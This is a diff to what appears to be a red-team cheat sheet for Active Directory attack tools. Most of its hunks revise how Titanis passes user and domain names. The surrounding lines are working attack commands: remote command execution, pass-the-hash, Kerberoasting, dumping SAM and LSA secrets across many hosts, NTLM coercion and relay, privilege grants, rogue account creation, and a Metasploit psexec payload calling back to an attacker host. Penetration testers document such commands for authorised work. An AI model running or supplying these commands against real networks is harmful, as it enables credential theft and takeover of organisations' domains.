@@ -122,7 +122,7 @@ wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami"
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami"
 
 # Titanis
-Wmi exec 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 "whoami"
+Wmi exec 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 "whoami"
 
 # impacket — pass-the-hash
 wmiexec.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 "ipconfig"
@@ -141,7 +141,7 @@ wmiexec.py -k -no-pass DOMAIN/jdoe@dc01.domain.local "hostname"
 # Use the short hostname as target (for Kerberos SPN + application protocol);
 # use -ha for the actual TCP connection (IP or FQDN). FQDNs as the target fail
 # because the server expects the short hostname in the WMI activation request.
-Wmi exec dc01 -ha 192.168.1.10 -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password Password123 "hostname"
+Wmi exec dc01 -ha 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Kdc 192.168.1.1 -Password Password123 "hostname"
 
 # Titanis — Kerberos with ccache TGT (Titanis-generated only; see TicketCache note)
 Wmi exec dc01 -ha 192.168.1.10 -Tgt /tmp/jdoe.ccache -Kdc 192.168.1.1 "hostname"
@@ -174,16 +174,16 @@ netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomex
 # Titanis — MMC20.Application ExecuteShellCommand (requires v0.9.20260320+)
 # 4 args: Command, Directory, Parameters, WindowState (7=minimized)
 # ExecuteShellCommand does not return output — redirect to a file and retrieve via Smb2Client
-Dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Dcom invoke 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   49B2791A-B1AE-4C90-9B8E-E860BA07F889 \
   Document.ActiveView.ExecuteShellCommand \
   cmd.exe 'C:\' '/c whoami > C:\Windows\Temp\out.txt' '7'
 
-Smb2Client get -UserName jdoe@DOMAIN -Password Password123 \
+Smb2Client get -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   '\\192.168.1.10\C$\Windows\Temp\out.txt'
 
 # Titanis — ShellBrowserWindow Navigate (launches exe, no args — works on older versions too)
-Dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Dcom invoke 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   '{C08AFD90-F2A1-11D1-8455-00A0C91F3880}' Navigate \
   'C:\Windows\System32\cmd.exe'
 
@@ -194,7 +194,7 @@ wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 \
 # → (Default)    REG_SZ    {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
 
 # Step 2 (optional): inspect the CLSID entry to confirm AppID/auth level
-Reg list 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Reg list 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   'HKLM\SOFTWARE\Classes\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
 ```
 
@@ -224,11 +224,11 @@ msf6 exploit(psexec) > run rhosts=192.168.1.10 smbdomain=DOMAIN smbuser=jdoe \
   payload=windows/x64/meterpreter/reverse_tcp lhost=<attacker-ip>
 
 # Titanis — create service, retrieve output, clean up
-Scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc \
+Scm create 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 mysvc \
   "C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Temp\out.txt" -Start
-Smb2Client get \\192.168.1.10\ADMIN$\Temp\out.txt out.txt -UserName jdoe@DOMAIN -Password Password123
-Scm stop   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
-Scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
+Smb2Client get \\192.168.1.10\ADMIN$\Temp\out.txt out.txt -UserName jdoe -UserDomain DOMAIN -Password Password123
+Scm stop   192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 mysvc
+Scm delete 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 mysvc
 ```
 
 [↑ Back to Index](#index)
@@ -241,15 +241,15 @@ Scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
 
 ```bash
 # Titanis — create immediate scheduled task via Win32_ScheduledJob
-Wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Wmi invoke 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   Win32_ScheduledJob Create \
   "Command='cmd /c whoami > C:\\Windows\\Temp\\out.txt',StartTime='********143000.000000+000'"
 
 # Titanis — retrieve output and clean up
 Smb2Client get \\192.168.1.10\C$\Windows\Temp\out.txt out.txt \
-  -UserName jdoe@DOMAIN -Password Password123
+  -UserName jdoe -UserDomain DOMAIN -Password Password123
 Smb2Client rm  \\192.168.1.10\C$\Windows\Temp\out.txt \
-  -UserName jdoe@DOMAIN -Password Password123
+  -UserName jdoe -UserDomain DOMAIN -Password Password123
 
 # impacket — true MS-TSCH (creates, runs, and cleans up automatically)
 atexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami > C:\Windows\Temp\out.txt"
@@ -278,7 +278,7 @@ netexec smb 192.168.1.0/24 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -x "whoam
 # Titanis — loop over a host list
 while IFS= read -r host; do
   echo "=== $host ===" >> exec_results.txt
-  wmi exec "$host" -UserName jdoe@DOMAIN -Password Password123 \
+  wmi exec "$host" -UserName jdoe -UserDomain DOMAIN -Password Password123 \
     "whoami /all" >> exec_results.txt 2>&1
 done < hosts.txt
 ```
@@ -444,7 +444,7 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # Titanis — enumerate SPNs, get TGT, loop tgsreq per SPN, extract hashes
 # Use Ldap query (not Ldap search) — requires -FollowReferrals on Linux
 # -OutputFields takes one field at a time on Linux; use -OutputStyle List to get multiple attrs
-Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "(servicePrincipalName=*)" -OutputFields servicePrincipalName \
   -OutputStyle List -FollowReferrals 2>/dev/null \
   | awk '/^servicePrincipalName:/{print $2}' > spns.txt
@@ -499,7 +499,7 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 
 # Titanis — find targets via LDAP, loop asreq
 # Note: -FollowReferrals required on Linux — default behavior prints referral as INFO and returns no records
-Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "(userAccountControl|=4194304)" \
   -OutputFields sAMAccountName -FollowReferrals > asrep_targets.txt
 while IFS= read -r user; do
@@ -1134,7 +1134,7 @@ pypykatz smb regdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10" --sam
 
 # Titanis — requires -BackupSemantics even as domain admin; without it → ACCESS_DENIED
-Reg dumpsam 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics
+Reg dumpsam 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
 
 # Titanis — backup operator (no admin required, -BackupSemantics still required)
 Reg dumpsam 192.168.1.10 -UserName backupuser@DOMAIN \
@@ -1168,7 +1168,7 @@ pypykatz smb regdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10" --lsa
 
 # Titanis — requires -BackupSemantics; without it → ACCESS_DENIED
-Reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics
+Reg dumplsasecrets 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
 ```
 
 [↑ Back to Index](#index)
@@ -1201,8 +1201,8 @@ pypykatz smb lsassdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B
 pypykatz smb secretsdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 
 # Titanis — requires -BackupSemantics for both; without it → ACCESS_DENIED
-Reg dumpsam        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics
-Reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics
+Reg dumpsam        192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
+Reg dumplsasecrets 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
 ```
 
 [↑ Back to Index](#index)
@@ -1228,8 +1228,8 @@ done < hosts.txt
 # Titanis
 while IFS= read -r host; do
   echo "=== $host ===" | tee -a sam_dump.txt
-  reg dumpsam        "$host" -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics >> sam_dump.txt 2>&1
-  reg dumplsasecrets "$host" -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics >> lsa_dump.txt 2>&1
+  reg dumpsam        "$host" -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics >> sam_dump.txt 2>&1
+  reg dumplsasecrets "$host" -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics >> lsa_dump.txt 2>&1
 done < hosts.txt
 ```
 
@@ -1669,9 +1669,9 @@ netexec smb 192.168.1.10 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
   --wmi "SELECT * FROM Win32_Process"
 
 # Titanis
-Wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Wmi query 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "SELECT * FROM Win32_Process"
-Wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Wmi query 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   -OutputFields Caption,ProcessId,ParentProcessId "SELECT * FROM Win32_Process"
 ```
 
@@ -1686,7 +1686,7 @@ Wmi query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
 wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 "calc.exe"
 
 # Titanis — invoke any WMI method directly
-Wmi invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Wmi invoke 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   Win32_Process Create "calc.exe"
 ```
 
@@ -1705,7 +1705,7 @@ reg.py DOMAIN/jdoe:Password123@192.168.1.10 query \
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LsaCfgFlags"
 
 # Titanis — list key
-Reg list 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Reg list 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion
 
 # impacket — read a value
@@ -1713,7 +1713,7 @@ reg.py DOMAIN/jdoe:Password123@192.168.1.10 query \
   -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v LsaCfgFlags
 
 # Titanis — read a value
-Reg get 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Reg get 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   HKLM/SYSTEM/CurrentControlSet/Control/Lsa LsaCfgFlags
 
 # impacket — set a value
@@ -1721,7 +1721,7 @@ reg.py DOMAIN/jdoe:Password123@192.168.1.10 add \
   -keyName HKCU\\Software\\Test -v TestValue -vt REG_SZ -vd "TestData"
 
 # Titanis — set a value
-Reg set 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Reg set 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   HKCU/Software/Test sz:TestValue=TestData
 ```
 
@@ -1737,8 +1737,8 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "regetkeysecurity HKLM\\S
 rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "regsetsecurity HKLM\\SAM <SDDL>"
 
 # Titanis
-Reg getsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 HKLM/SAM
-Reg setsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Reg getsd 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 HKLM/SAM
+Reg setsd 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   HKLM/SAM "O:BAG:SYD:(A;;KA;;;SY)"
 ```
 
@@ -1761,20 +1761,20 @@ asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
 # smb> tasks
 
 # Titanis — query all services
-Scm query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123
+Scm query 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
 
 # impacket — start / stop
 services.py DOMAIN/jdoe:Password123@192.168.1.10 start -name Spooler
 services.py DOMAIN/jdoe:Password123@192.168.1.10 stop  -name Spooler
 
 # Titanis — start / stop
-Scm start 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 Spooler
-Scm stop  192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 Spooler
+Scm start 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 Spooler
+Scm stop  192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 Spooler
 
 # Titanis — create / delete
-Scm create 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc \
+Scm create 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 mysvc \
   "C:\Windows\System32\cmd.exe"
-Scm delete 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 mysvc
+Scm delete 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 mysvc
 ```
 
 [↑ Back to Index](#index)
@@ -1802,13 +1802,13 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 \
 #
 # Step 1 — create LSA account entry if target has no existing explicit rights
 Lsa createaccount 192.168.1.10 S-1-5-21-...-1001 \
-  -UserName jdoe@DOMAIN -Password Password123 -PreferSmb
+  -UserName jdoe -UserDomain DOMAIN -Password Password123 -PreferSmb
 # Step 2 — add/remove privilege
-Lsa addpriv  192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Lsa addpriv  192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   -BySid S-1-5-21-...-1001 SeDebugPrivilege -PreferSmb
-Lsa rmpriv   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Lsa rmpriv   192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   -BySid S-1-5-21-...-1001 SeDebugPrivilege -PreferSmb
-Lsa setsysaccess 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+Lsa setsysaccess 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   -BySid S-1-5-21-...-1001 0x20 -PreferSmb
 ```
 
@@ -1827,11 +1827,11 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 -c "enumprivs"
 enum4linux-ng -P 192.168.1.10 -u jdoe -p Password123
 
 # Titanis
-Lsa enumaccounts     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123  # requires admin
-Lsa enumprivaccounts 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -Privilege SeDebugPrivilege
-Lsa getprivs         192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
-Lsa getrights        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
-Lsa getsysaccess     192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe
+Lsa enumaccounts     192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123  # requires admin
+Lsa enumprivaccounts 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -Privilege SeDebugPrivilege
+Lsa getprivs         192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -ByName jdoe
+Lsa getrights        192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -ByName jdoe
+Lsa getsysaccess     192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -ByName jdoe
 ```
 
 [↑ Back to Index](#index)
@@ -1875,8 +1875,8 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1/?proxytype=sock
 #   - -FollowReferrals required — without it, referral targets are printed as INFO and results are empty
 #   - -OutputFields only accepts one field at a time on Linux; comma lists show header but no rows
 #     Workaround: -OutputFields '*' -OutputStyle List and grep/parse
-Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=user)" -FollowReferrals
-Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 "(objectClass=computer)" -FollowReferrals
+Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 "(objectClass=user)" -FollowReferrals
+Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 "(objectClass=computer)" -FollowReferrals
 ```
 
 [↑ Back to Index](#index)
@@ -1900,21 +1900,21 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # Titanis — enumerate GPO containers
 # Use Ldap query + -FollowReferrals on Linux; -OutputFields comma list works on Windows only
 # Linux: use -OutputStyle List and parse, or -OutputFields * and grep
-Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "(objectClass=groupPolicyContainer)" \
   -OutputFields displayName,gPCFileSysPath,versionNumber -FollowReferrals
 
 # Titanis — enumerate domain trusts
-Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "(objectClass=trustedDomain)" \
   -OutputFields name,trustDirection,trustType,trustAttributes,flatName -FollowReferrals
 
 # Titanis — Kerberos auth variants
-Ldap query dc01.domain.local -UserName jdoe@DOMAIN -Kdc 192.168.1.1 \
+Ldap query dc01.domain.local -UserName jdoe -UserDomain DOMAIN -Kdc 192.168.1.1 \
   -Password Password123 "(objectClass=groupPolicyContainer)" \
   -OutputFields displayName,gPCFileSysPath -FollowReferrals
 # ⚠️ -TicketCache only works with Titanis-native ccache; use -Tgt with a Titanis-generated TGT instead
-# Ldap query dc01.domain.local -UserName jdoe@DOMAIN \
+# Ldap query dc01.domain.local -UserName jdoe -UserDomain DOMAIN \
 #   -TicketCache jdoe.ccache "(objectClass=trustedDomain)" -OutputFields * -FollowReferrals
 
 # ldapsearch — raw GPO objects
@@ -1945,15 +1945,15 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # msldap> unconstrained
 
 # Titanis — unconstrained
-Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "(userAccountControl|=TrustedForDelegation)" -OutputFields * -FollowReferrals
 
 # Titanis — constrained
-Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "(msDS-AllowedToDelegateTo=*)" -OutputFields * -FollowReferrals
 
 # Titanis — S4U2self only
-Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "(userAccountControl|=TrustedForS4U2self)" -OutputFields * -FollowReferrals
 ```
 
@@ -1963,14 +1963,12 @@ Ldap query 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
 
 ### Add a Computer Account
 
-> **⚠️ LDAPS channel binding:** DCs with LDAP channel binding enforced (`LdapEnforceChannelBinding = 1`, default on Server 2019+) reject LDAPS binds that do not include a channel binding token. Neither impacket `addcomputer.py -method LDAPS` nor Titanis `Ldap addcomputer -Ssl` send a channel binding token — both fail with `invalidCredentials` / error 49 even with correct credentials. Use `bloodyAD` (which handles channel binding) or the `-method SAMR` fallback (plain SMB, no TLS required):
-
 ```bash
-# impacket — SAMR method (no LDAPS required; works without channel binding)
+# impacket — SAMR method (no LDAPS required)
 addcomputer.py -method SAMR -computer-name EVILPC$ -computer-pass Password123 \
   -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123
 
-# impacket — LDAPS method (fails if DC enforces channel binding)
+# impacket — LDAPS method
 addcomputer.py -method LDAPS -computer-name EVILPC$ -computer-pass Password123 \
   -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123
 
@@ -1978,14 +1976,20 @@ addcomputer.py -method LDAPS -computer-name EVILPC$ -computer-pass Password123 \
 addcomputer.py -method SAMR -computer-name EVILPC$ -computer-pass Password123 \
   -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -dc-ip 192.168.1.1 DOMAIN/jdoe
 
-# bloodyAD — handles channel binding; preferred LDAPS path
+# bloodyAD
 bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 add computer EVILPC$ Password123!
 
 # NetExec
 netexec smb 192.168.1.1 -u jdoe -p Password123 -M add-computer -o NAME=EVILPC$ PASSWORD=Password123
 
-# Titanis — fails if DC enforces LDAPS channel binding
-Ldap addcomputer 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 EVILPC$ Password123
+# Titanis — plain LDAP (creates account, unicodePwd not set without -Ssl)
+Ldap addcomputer 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
+  'CN=EVILPC$,CN=Computers,DC=domain,DC=local'
+
+# Titanis — LDAPS (sets unicodePwd; use full DN as ObjectName)
+Ldap addcomputer 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
+  -NewPassword Password123! -Ssl \
+  'CN=EVILPC$,CN=Computers,DC=domain,DC=local'
 ```
 
 [↑ Back to Index](#index)
@@ -2009,7 +2013,7 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
 net rpc user add newuser Password123! -U DOMAIN/jdoe%Password123 -S 192.168.1.10
 
 # Titanis
-Ldap adduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 newuser Password123!
+Ldap adduser 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 newuser Password123!
 ```
 
 [↑ Back to Index](#index)
@@ -2071,7 +2075,7 @@ owneredit.py -action write -new-owner jdoe \
   DOMAIN/admin:AdminPass@192.168.1.1
 
 # Titanis — post-exploitation after ACE grant (force password reset)
-Kerb setpw -UserName jdoe@DOMAIN -Kdc 192.168.1.1 -Password jdoePass \
+Kerb setpw -UserName jdoe -UserDomain DOMAIN -Kdc 192.168.1.1 -Password jdoePass \
   targetuser@DOMAIN NewPass123
 ```
 
@@ -2095,7 +2099,7 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 \
   remove uac targetuser -f ACCOUNTDISABLE
 
 # Titanis
-Ldap moduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+Ldap moduser 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   targetuser userAccountControl+=4194304
 ```
 
@@ -2110,11 +2114,11 @@ Ldap moduser 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
 ```bash
 # MS-EFSR — single technique
 CredCoerce 192.168.1.10 \\<listener-ip>\share \
-  -UserName jdoe@DOMAIN -Password Password123 -Techniques Efs.OpenFile
+  -UserName jdoe -UserDomain DOMAIN -Password Password123 -Techniques Efs.OpenFile
 
 # MS-EFSR — multiple techniques
 CredCoerce 192.168.1.10 \\<listener-ip>\share \
-  -UserName jdoe@DOMAIN -Password Password123 \
+  -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   -Techniques Efs.OpenFile,Efs.EncryptFile,Efs.DecryptFile,\
   Efs.QueryUsersOnFile,Efs.QueryRecoveryAgents,Efs.FileKeyInfo,\
   Efs.DuplicateEncryptionInfoFile
@@ -2149,7 +2153,7 @@ ntlmrelayx.py -t ldaps://192.168.1.1 --delegate-access --escalate-user jdoe
 
 # Terminal 2 — trigger coercion
 CredCoerce 192.168.1.10 \\<relay-listener-ip>\share \
-  -UserName jdoe@DOMAIN -Password Password123 -Techniques Efs.OpenFile
+  -UserName jdoe -UserDomain DOMAIN -Password Password123 -Techniques Efs.OpenFile
 ```
 
 [↑ Back to Index](#index)
@@ -2202,13 +2206,13 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1"
 # Note: Ldap search is broken on Linux (ignores -SearchBase, always queries RootDSE → no results)
 # Use ldapsearch below for Linux; Ldap search works on Windows
 # Windows only:
-# Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+# Ldap search 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
 #   -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
 #   "(objectClass=pKICertificateTemplate)" \
 #   -OutputFields displayName,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,pKIExtendedKeyUsage
 
 # Titanis — enumerate Enterprise CAs (Windows only — same Ldap search limitation on Linux)
-# Ldap search 192.168.1.1 -UserName jdoe@DOMAIN -Password Password123 \
+# Ldap search 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
 #   -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
 #   "(objectClass=pKIEnrollmentService)" \
 #   -OutputFields displayName,dNSHostName,certificateTemplates
